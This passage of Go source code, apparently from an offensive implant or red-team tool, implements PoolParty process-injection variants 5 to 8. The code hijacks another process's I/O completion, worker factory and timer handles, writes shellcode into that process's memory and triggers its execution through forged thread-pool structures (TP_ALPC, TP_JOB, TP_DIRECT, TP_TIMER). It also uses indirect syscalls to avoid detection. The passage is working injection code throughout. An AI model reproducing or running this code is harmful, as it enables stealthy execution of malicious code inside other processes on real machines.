	output += fmt.Sprintf("[+] Allocated TP_ALPC memory at: 0x%X\n", tpAlpcAddr)

	// Step 10: Write TP_ALPC to target process
	tpAlpcBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpAlpc))[:unsafe.Sizeof(tpAlpc)]
	bytesWritten, err := injectWriteMemory(hProcess, tpAlpcAddr, tpAlpcBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_ALPC failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_ALPC structure (%d bytes)\n", bytesWritten)

	// Step 11: Associate ALPC port with target's I/O completion port
	alpcAssoc := ALPC_PORT_ASSOCIATE_COMPLETION_PORT{
		CompletionKey:  tpAlpcAddr,
		CompletionPort: uintptr(hIoCompletion),
	}
	status, _, _ = procNtAlpcSetInformation.Call(
		hAlpc,
		uintptr(AlpcAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&alpcAssoc)),
		uintptr(unsafe.Sizeof(alpcAssoc)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtAlpcSetInformation failed: 0x%X", status)
	}
	output += "[+] Associated ALPC port with target's I/O completion port\n"

	// Step 12: Connect to ALPC port to trigger completion
	var hClientPort uintptr
	var clientObjAttr OBJECT_ATTRIBUTES
	clientObjAttr.Length = uint32(unsafe.Sizeof(clientObjAttr))

	// Prepare message
	message := "PoolParty ALPC trigger"
	var alpcMessage ALPC_MESSAGE
	alpcMessage.PortHeader.DataLength = uint16(len(message))
	alpcMessage.PortHeader.TotalLength = uint16(unsafe.Sizeof(alpcMessage.PortHeader)) + uint16(len(message))
	copy(alpcMessage.PortMessage[:], message)
	messageSize := uintptr(unsafe.Sizeof(alpcMessage))

	// Set timeout to 1 second to prevent blocking
	var timeout int64 = -10000000 // 1 second in 100-nanosecond intervals

	status, _, _ = procNtAlpcConnectPort.Call(
		uintptr(unsafe.Pointer(&hClientPort)),
		uintptr(unsafe.Pointer(&usPortName)),
		uintptr(unsafe.Pointer(&clientObjAttr)),
		uintptr(unsafe.Pointer(&portAttr)),
		0x20000, // Connection flags
		0,       // RequiredServerSid
		uintptr(unsafe.Pointer(&alpcMessage)),
		uintptr(unsafe.Pointer(&messageSize)),
		0, // OutMessageAttributes
		0, // InMessageAttributes
		uintptr(unsafe.Pointer(&timeout)),
	)
	// NtAlpcConnectPort may return timeout status, which is expected
	output += "[+] Connected to ALPC port to trigger completion\n"
	output += "[+] PoolParty Variant 5 injection completed successfully\n"

	return output, nil
}

// executeVariant6 implements TP_JOB Insertion via Job object assignment
func executeVariant6(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 6: TP_JOB Insertion\n"
	if IndirectSyscallsAvailable() {
		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
	}
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := injectOpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer injectCloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3+4: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return output, fmt.Errorf("shellcode alloc+write+protect failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)

	// Step 5: Create job object
	jobName := fmt.Sprintf("PoolPartyJob%d", pid)
	jobNameUTF16, _ := windows.UTF16PtrFromString(jobName)
	hJob, _, err := procCreateJobObjectW.Call(
		0, // Security attributes
		uintptr(unsafe.Pointer(jobNameUTF16)),
	)
	if hJob == 0 {
		return output, fmt.Errorf("CreateJobObjectW failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hJob))
	output += fmt.Sprintf("[+] Created job object '%s'\n", jobName)

	// Step 6: Allocate TP_JOB structure via TpAllocJobNotification
	var pTpJob uintptr
	status, _, _ := procTpAllocJobNotification.Call(
		uintptr(unsafe.Pointer(&pTpJob)),
		hJob,
		shellcodeAddr, // Job callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if status != 0 {
		return output, fmt.Errorf("TpAllocJobNotification failed: 0x%X", status)
	}
	output += "[+] Created TP_JOB structure associated with shellcode\n"

	// Step 7: Allocate memory for TP_JOB in target process
	var tpJob FULL_TP_JOB
	tpJobAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpJob)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_JOB failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_JOB memory at: 0x%X\n", tpJobAddr)

	// Step 8: Write TP_JOB to target process
	tpJobBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpJob))[:unsafe.Sizeof(tpJob)]
	bytesWritten, err := injectWriteMemory(hProcess, tpJobAddr, tpJobBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_JOB failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_JOB structure (%d bytes)\n", bytesWritten)

	// Step 9: Zero out existing job completion info (required before re-setting)
	var zeroAssoc JOBOBJECT_ASSOCIATE_COMPLETION_PORT
	ret, _, err := procSetInformationJobObject.Call(
		hJob,
		uintptr(JobObjectAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&zeroAssoc)),
		uintptr(unsafe.Sizeof(zeroAssoc)),
	)
	if ret == 0 {
		return output, fmt.Errorf("SetInformationJobObject (zero) failed: %v", err)
	}
	output += "[+] Zeroed out job object completion info\n"

	// Step 10: Associate job with target's I/O completion port
	jobAssoc := JOBOBJECT_ASSOCIATE_COMPLETION_PORT{
		CompletionKey:  tpJobAddr,
		CompletionPort: uintptr(hIoCompletion),
	}
	ret, _, err = procSetInformationJobObject.Call(
		hJob,
		uintptr(JobObjectAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&jobAssoc)),
		uintptr(unsafe.Sizeof(jobAssoc)),
	)
	if ret == 0 {
		return output, fmt.Errorf("SetInformationJobObject failed: %v", err)
	}
	output += "[+] Associated job object with target's I/O completion port\n"

	// Step 11: Assign current process to job to trigger completion
	hCurrentProcess, _, _ := procGetCurrentProcess.Call()
	ret, _, err = procAssignProcessToJobObject.Call(
		hJob,
		hCurrentProcess,
	)
	if ret == 0 {
		return output, fmt.Errorf("AssignProcessToJobObject failed: %v", err)
	}
	output += "[+] Assigned current process to job object to trigger completion\n"
	output += "[+] PoolParty Variant 6 injection completed successfully\n"

	return output, nil
}

// executeVariant7 implements TP_DIRECT Insertion via I/O Completion Port
func executeVariant7(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 7: TP_DIRECT Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	if IndirectSyscallsAvailable() {
		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
	}

	// Step 1: Open target process
	desiredAccess := uint32(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
		PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION)
	hProcess, err := injectOpenProcess(desiredAccess, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack IoCompletion handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3: Allocate and write shellcode (W^X: RW → write → RX)
	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return output, fmt.Errorf("shellcode injection failed: %v", err)
	}
	output += fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)

	// Step 4: Create and write TP_DIRECT structure
	tpDirect := TP_DIRECT{
		Callback: shellcodeAddr,
	}
	tpDirectBytes := (*[unsafe.Sizeof(TP_DIRECT{})]byte)(unsafe.Pointer(&tpDirect))[:]

	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_DIRECT failed: %v", err)
	}
	_, err = injectWriteMemory(hProcess, tpDirectAddr, tpDirectBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] TP_DIRECT at: 0x%X\n", tpDirectAddr)

	// Step 8: Queue completion packet via ZwSetIoCompletion
	status, _, _ := procZwSetIoCompletion.Call(
		uintptr(hIoCompletion),
		tpDirectAddr, // KeyContext - pointer to TP_DIRECT
		0,            // ApcContext
		0,            // IoStatus
		0,            // IoStatusInformation
	)
	if status != 0 {
		return output, fmt.Errorf("ZwSetIoCompletion failed: 0x%X", status)
	}
	output += "[+] Queued packet to I/O completion port\n"
	output += "[+] PoolParty Variant 7 injection completed successfully\n"

	return output, nil
}

// executeVariant8 implements TP_TIMER Insertion - Variant 8
func executeVariant8(shellcode []byte, pid uint32) (string, error) {
	var output string
	output = fmt.Sprintf("[*] PoolParty Variant 8: TP_TIMER Insertion\n")
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	if IndirectSyscallsAvailable() {
		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
	}

	// Step 1: Open target process
	desiredAccess := uint32(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
		PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION)
	hProcess, err := injectOpenProcess(desiredAccess, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack worker factory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("Failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Hijack IR timer handle
	hTimer, err := hijackProcessHandle(hProcess, "IRTimer", windows.TIMER_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("Failed to hijack timer handle: %v", err)
	}
	defer windows.CloseHandle(hTimer)
	output += fmt.Sprintf("[+] Hijacked timer queue handle: 0x%X\n", hTimer)

	// Step 4: Query worker factory to get TP_POOL address
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	var returnLength uint32
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)

	// Step 5: Allocate and write shellcode (W^X: RW → write → RX)
	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return output, fmt.Errorf("shellcode injection failed: %v", err)
	}
	output += fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)

	// Step 6: Create TP_TIMER structure via CreateThreadpoolTimer
	pTpTimer, _, err := procCreateThreadpoolTimer.Call(
		shellcodeAddr, // Timer callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpTimer == 0 {
		return output, fmt.Errorf("timer item creation failed: %v", err)
	}
	output += "[+] Created TP_TIMER structure associated with shellcode\n"

	// Step 7: Allocate memory for TP_TIMER in target process
	var tpTimer FULL_TP_TIMER
	tpTimerAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpTimer)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_TIMER failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_TIMER memory at: 0x%X\n", tpTimerAddr)

	// Step 8: Cast the pointer to access the structure directly like SafeBreach does
	// SafeBreach directly modifies the structure returned by CreateThreadpoolTimer
	pTimer := (*FULL_TP_TIMER)(unsafe.Pointer(pTpTimer))

	// Step 9: Modify TP_TIMER structure for insertion
	const timeout int64 = -10000000 // 1 second in 100-nanosecond intervals (negative = relative)

	// Set Pool pointer to target's TP_POOL
	pTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter

	// Note: CreateThreadpoolTimer should have set the Callback to shellcodeAddr already
	// SafeBreach doesn't manually set Callback - they pass it to CreateThreadpoolTimer

	// Set timer expiration
	pTimer.DueTime = timeout
	pTimer.WindowStartLinks.Key = timeout
	pTimer.WindowEndLinks.Key = timeout

	// Set up circular lists for WindowStart and WindowEnd Children only (NOT Siblings - SafeBreach doesn't set those)
	// Calculate remote addresses for the Window*Links.Children fields
	// Use dummy struct for offset calculation
	var dummyTimer FULL_TP_TIMER
	remoteWindowStartChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks.Children))
	remoteWindowEndChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks.Children))

	pTimer.WindowStartLinks.Children.Flink = remoteWindowStartChildrenAddr
	pTimer.WindowStartLinks.Children.Blink = remoteWindowStartChildrenAddr
	pTimer.WindowEndLinks.Children.Flink = remoteWindowEndChildrenAddr
	pTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr

	// Step 10: Write TP_TIMER to target process
	timerBytes := (*[unsafe.Sizeof(FULL_TP_TIMER{})]byte)(unsafe.Pointer(pTpTimer))[:]
	bytesWritten, err := injectWriteMemory(hProcess, tpTimerAddr, timerBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_TIMER failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_TIMER structure (%d bytes)\n", bytesWritten)

	// Step 11: Calculate addresses for WindowStart and WindowEnd roots in target TP_POOL

	// Step 12: Update TP_POOL's TimerQueue WindowStart and WindowEnd roots to point to our timer
	// SafeBreach writes to pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root

	targetTpPoolAddr := workerFactoryInfo.StartParameter

	// Calculate offsets step by step - Go doesn't handle nested offsetof well
	var dummyPool FULL_TP_POOL
	var dummyTimerQueue TPP_TIMER_QUEUE
	var dummySubQueue TPP_TIMER_SUBQUEUE

	timerQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
	absoluteQueueOffset := uintptr(unsafe.Offsetof(dummyTimerQueue.AbsoluteQueue))
	windowStartOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowStart))
	windowEndOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowEnd))

	// WindowStart.Root and WindowEnd.Root - Root is first field of TPP_PH so offset is 0
	windowStartRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowStartOffset
	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset

	// Calculate address of our timer's WindowStartLinks and WindowEndLinks
	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks))
	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks))

	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", targetTpPoolAddr)
	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X, absoluteQueueOffset = 0x%X\n", timerQueueOffset, absoluteQueueOffset)
	output += fmt.Sprintf("[*] Debug: windowStartOffset = 0x%X, windowEndOffset = 0x%X\n", windowStartOffset, windowEndOffset)
	output += fmt.Sprintf("[*] Debug: windowStartRootAddr = 0x%X\n", windowStartRootAddr)
	output += fmt.Sprintf("[*] Debug: windowEndRootAddr = 0x%X\n", windowEndRootAddr)
	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWindowStartLinksAddr)
	output += fmt.Sprintf("[*] Debug: remoteWindowEndLinksAddr = 0x%X\n", remoteWindowEndLinksAddr)

	// Write WindowStartLinks address to WindowStart.Root
	windowStartBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowStartLinksAddr))[:]
	_, err = injectWriteMemory(hProcess, windowStartRootAddr, windowStartBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for WindowStart.Root failed: %v", err)
	}

	// Write WindowEndLinks address to WindowEnd.Root
	windowEndBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowEndLinksAddr))[:]
	_, err = injectWriteMemory(hProcess, windowEndRootAddr, windowEndBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for WindowEnd.Root failed: %v", err)
	}
	output += "[+] Modified target process's TP_POOL timer queue to point to TP_TIMER\n"

	// Step 13: Set the timer to expire via NtSetTimer2
	var dueTime int64
	dueTime = timeout

	var params T2_SET_PARAMETERS
	status, _, _ = procNtSetTimer2.Call(
		uintptr(hTimer),
		uintptr(unsafe.Pointer(&dueTime)),
		0, // Period
		uintptr(unsafe.Pointer(&params)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtSetTimer2 failed: 0x%X", status)
	}
	output += "[+] Set timer to expire and trigger TppTimerQueueExpiration\n"
	output += "[+] PoolParty Variant 8 injection completed successfully\n"

	return output, nil
}

// hijackProcessHandle enumerates handles in target process and duplicates one of the specified type
func hijackProcessHandle(hProcess uintptr, objectType string, desiredAccess uint32) (windows.Handle, error) {
	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
	const maxRetries = 5

	// Start with a reasonable initial buffer size and retry with increasing sizes
	var buffer []byte
	var returnLength uint32
	bufferSize := uint32(64 * 1024) // Start with 64KB

	var status uintptr
	for i := 0; i < maxRetries; i++ {
		buffer = make([]byte, bufferSize)
		status, _, _ = procNtQueryInformationProcess.Call(
			hProcess,
			uintptr(ProcessHandleInformation),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(bufferSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)

		if status == 0 {
			break // Success
		}

		if status == STATUS_INFO_LENGTH_MISMATCH {
			// Double the buffer size for next attempt, or use returnLength if provided
			if returnLength > bufferSize {
				bufferSize = returnLength + 4096
			} else {
				bufferSize *= 2
			}
			continue
		}

		// Some other error
		return 0, fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
	}

	if status != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess failed after %d retries: 0x%X (buffer size: %d)", maxRetries, status, bufferSize)
	}

	// Parse handle information
	handleInfo := (*PROCESS_HANDLE_SNAPSHOT_INFORMATION)(unsafe.Pointer(&buffer[0]))
	handleEntrySize := unsafe.Sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO{})
	handleArrayOffset := unsafe.Sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION{})

	// Iterate through handles
	for i := uintptr(0); i < uintptr(handleInfo.NumberOfHandles); i++ {
		entryOffset := handleArrayOffset + (i * handleEntrySize)
		if entryOffset+handleEntrySize > uintptr(len(buffer)) {
			break
		}

		entry := (*PROCESS_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&buffer[entryOffset]))

		// Try to duplicate the handle
		var duplicatedHandle windows.Handle
		err := windows.DuplicateHandle(
			windows.Handle(hProcess),
			entry.HandleValue,
			windows.CurrentProcess(),
			&duplicatedHandle,
			desiredAccess,
			false,
			0,
		)
		if err != nil {
			continue
		}

		// Query the object type
		typeName, err := getObjectTypeName(duplicatedHandle)
		if err != nil {
			windows.CloseHandle(duplicatedHandle)
			continue
		}

		if typeName == objectType {
			return duplicatedHandle, nil
		}

		windows.CloseHandle(duplicatedHandle)
	}

	return 0, fmt.Errorf("failed to find handle of type: %s", objectType)
}

// getObjectTypeName queries the type name of an object handle
func getObjectTypeName(handle windows.Handle) (string, error) {
	// First call to get required buffer size
	var returnLength uint32
	procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		0,
		0,
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if returnLength == 0 {
		returnLength = 256
	}

	buffer := make([]byte, returnLength)
	status, _, _ := procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(returnLength),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return "", fmt.Errorf("NtQueryObject failed: 0x%X", status)
	}

	// Parse PUBLIC_OBJECT_TYPE_INFORMATION
	typeInfo := (*PUBLIC_OBJECT_TYPE_INFORMATION)(unsafe.Pointer(&buffer[0]))

	// Convert UNICODE_STRING to Go string
	if typeInfo.TypeName.Buffer == nil || typeInfo.TypeName.Length == 0 {
		return "", fmt.Errorf("empty type name")
	}

	typeName := windows.UTF16PtrToString(typeInfo.TypeName.Buffer)
	return typeName, nil
}
